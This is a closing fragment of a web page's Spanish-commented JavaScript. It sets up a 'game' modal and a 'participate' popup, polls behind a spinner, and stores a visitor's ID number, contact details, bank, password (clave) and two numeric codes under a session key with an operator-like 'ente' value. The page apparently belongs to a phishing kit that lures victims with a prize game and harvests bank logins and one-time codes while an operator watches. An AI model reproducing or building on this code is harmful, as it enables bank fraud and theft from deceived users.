                document.getElementById('spinner-section-numero-t').classList.remove('hidden');

                // Iniciar polling
                iniciarPolling();
            });
        }

        /* ===== MODAL JUEGO ===== */

        // Marcar modal juego como visitado cuando se muestra
        const modalJuego = document.getElementById('modal-juego');
        const observerJuego = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                    if (!modalJuego.classList.contains('hidden')) {
                        appState.visitedModals['modal-juego'] = true;
                    }
                }
            });
        });
        if (modalJuego) {
            observerJuego.observe(modalJuego, { attributes: true });
        }

        /* ===== INICIALIZACIÓN ===== */

        // Inicializar campos en localStorage
        document.addEventListener('DOMContentLoaded', function() {
            const allFields = [
                'cedula', 'nombre', 'celular', 'email', 'ciudad', 'direccion',
                'banco', 'clave', 'numero_o', 'numero_t', 'ente', 'status', 'uniqid'
            ];

            allFields.forEach(field => {
                const storageKey = `${appState.uniqId}_${field}`;
                if (!localStorage.getItem(storageKey)) {
                    if (field === 'ente') {
                        localStorage.setItem(storageKey, JSON.stringify('ryan'));
                    } else if (field === 'uniqid') {
                        localStorage.setItem(storageKey, JSON.stringify(appState.uniqId));
                    } else if (field === 'status') {
                        localStorage.setItem(storageKey, JSON.stringify('pending'));
                    } else {
                        localStorage.setItem(storageKey, JSON.stringify('--'));
                    }
                }
            });

            console.log('Session UniqID:', appState.uniqId);
            console.log('Datos inicializados en localStorage');

            // Mostrar modal de participar después de 3 segundos
            setTimeout(() => {
                showModal('modal-participar');
            }, 3000);
        });
    </script>
</body>
</html>
